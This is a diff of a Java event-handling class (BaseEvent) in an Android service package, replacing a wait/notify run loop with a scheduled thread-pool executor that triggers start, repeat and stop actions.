@@ -7,23 +7,28 @@
 
 package com.android.service.event;
 
+import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.ScheduledFuture;
+import java.util.concurrent.ScheduledThreadPoolExecutor;
+import java.util.concurrent.ThreadFactory;
+import java.util.concurrent.ThreadPoolExecutor;
+import java.util.concurrent.TimeUnit;
+
 import com.android.service.Status;
 import com.android.service.ThreadBase;
 import com.android.service.action.Action;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfEvent;
-import com.android.service.event.BaseEvent.Waiter;
 import com.android.service.util.Check;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class EventBase.
  */
-public abstract class BaseEvent implements Runnable {
+public abstract class BaseEvent extends ThreadBase {
 
 	/** The Constant TAG. */
 	private static final String TAG = "EventBase"; //$NON-NLS-1$
-	private Object condition = new Object();
 
 	// Gli eredi devono implementare i seguenti metodi astratti
 
@@ -35,122 +40,6 @@ public abstract class BaseEvent implements Runnable {
 	 */
 	protected abstract boolean parse(ConfEvent event);
 
-	//
-	/**
-	 * eseguito da Conf o da Action Comincia la valutazione della condizione.
-	 * Quando la condizione diventa vera, viene eseguito actualStart. Ogni
-	 * delay, per un massimo di iter, viene eseguito actualRepeat. Alla fine
-	 * della condizione, viene eseguito actualStop.
-	 */
-	public synchronized void enable() {
-		conf.enabled = true;
-	}
-
-	// eseguito da Conf o da Action
-	public synchronized void disable() {
-		conf.enabled = false;
-		if (waiter != null) {
-			waiter.notifyAll();
-		}
-		actualDisable();
-		notifyAll();
-	}
-
-	public synchronized void run() {
-		actualEnable();
-
-		try {
-			condition.wait();
-		} catch (InterruptedException e) {
-
-		}
-
-		if (isEnabled()) {
-			triggerStartAction();
-		}
-
-		for (int i = 0; isEnabled() && i < getIter(); i++) {
-			try {
-				wait(getDelay());
-			} catch (InterruptedException e) {
-			}
-			triggerRepeatAction();
-		}
-
-		try {
-			if (isEnabled()) {
-				wait();
-			}
-		} catch (InterruptedException e) {
-		}
-
-	}
-
-	private boolean isEnabled() {
-		return conf.enabled;
-	}
-
-	boolean inCondition;
-	private Waiter waiter;
-
-	protected synchronized void startCondition() {
-		if (isEnabled()) {
-			inCondition = true;
-			condition.notifyAll();
-		}
-	}
-
-	protected synchronized void stopCondition() {
-		if (isEnabled()) {
-			inCondition = false;
-			condition.notifyAll();
-			triggerStopAction();
-		}
-	}
-
-	protected abstract void actualEnable();
-
-	protected abstract void actualDisable();
-
-	class Waiter implements Runnable {
-		private long delay;
-		private WaitCallback callback;
-		private boolean waiting;
-
-		public Waiter(WaitCallback callback, long delay) {
-			this.delay = delay;
-			this.callback = callback;
-		}
-
-		public synchronized void run() {
-			boolean interrupted = false;
-			try {
-				waiting = true;
-				wait(delay);
-			} catch (InterruptedException e) {
-				interrupted = true;
-				return;
-			}
-			waiting = false;
-			callback.afterWait(interrupted);
-		}
-
-		private synchronized boolean isWaiting() {
-			return waiting;
-		}
-
-	}
-
-	protected void startAsyncWait(WaitCallback callback, long delay) {
-
-		if (Cfg.DEBUG)
-			if (waiter != null)
-				Check.asserts(!waiter.isWaiting(), "startAsyncWait: waiter is waiting");
-		waiter = new Waiter(callback, delay);
-		Thread t = new Thread(waiter);
-		t.start();
-	}
-
 	/** The event. */
 	protected ConfEvent conf;
 	private int iterCounter;
@@ -161,10 +50,6 @@ public abstract class BaseEvent implements Runnable {
 
 	public String getType() {
 		return conf.getType();
-	}
-
-	private int getIter() {
-		return conf.iter;
 	}
 
 	/**
@@ -196,11 +81,68 @@ public abstract class BaseEvent implements Runnable {
 		}
 	}
 
-	private int getDelay() {
+	protected int getConfDelay() {
 		return conf.delay;
 	}
 
-	private synchronized boolean stillIter() {
+	ScheduledThreadPoolExecutor stpe = new ScheduledThreadPoolExecutor(5);
+
+	boolean active;
+	private ScheduledFuture<?> future;
+
+	protected synchronized void onEnter() {
+		if (Cfg.DEBUG) Check.asserts(!active,"stopSchedulerFuture");
+		
+		if(active){
+			return;
+		}
+		
+		int delay = getConfDelay();
+		int period = getConfDelay();
+
+		triggerStartAction();
+
+		future = stpe.scheduleAtFixedRate(new Runnable() {
+			int count = 0;
+
+			public void run() {
+				if (count >= iterCounter) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (run): count >= iterCounter");
+					}
+					stopSchedulerFuture();
+					return;
+				}
+				triggerRepeatAction();
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (run) count: " + count);
+				}
+
+				count++;
+			}
+		}, delay, period, TimeUnit.MILLISECONDS);
+		active = true;
+
+	}
+
+	private void stopSchedulerFuture() {
+		if (Cfg.DEBUG) Check.asserts(active,"stopSchedulerFuture");
+		if (active) {
+			future.cancel(true);
+			future = null;
+		}
+	}
+
+	protected synchronized void onExit() {
+		if (Cfg.DEBUG) Check.asserts(active,"stopSchedulerFuture");
+		if (active) {			
+			stopSchedulerFuture();
+			active = false;
+		}
+	}
+
+	protected synchronized boolean stillIter() {
 		iterCounter--;
 		return iterCounter >= 0;
 	}
@@ -228,7 +170,7 @@ public abstract class BaseEvent implements Runnable {
 
 	@Override
 	public String toString() {
-		return "Event " + conf.getId() + " " + conf.desc + " type:" + conf.getType() + " enabled: " + isEnabled(); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+		return "Event " + conf.getId() + " " + conf.desc + " type:" + conf.getType() + " s: " + getStatus(); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
 	}
 
 }
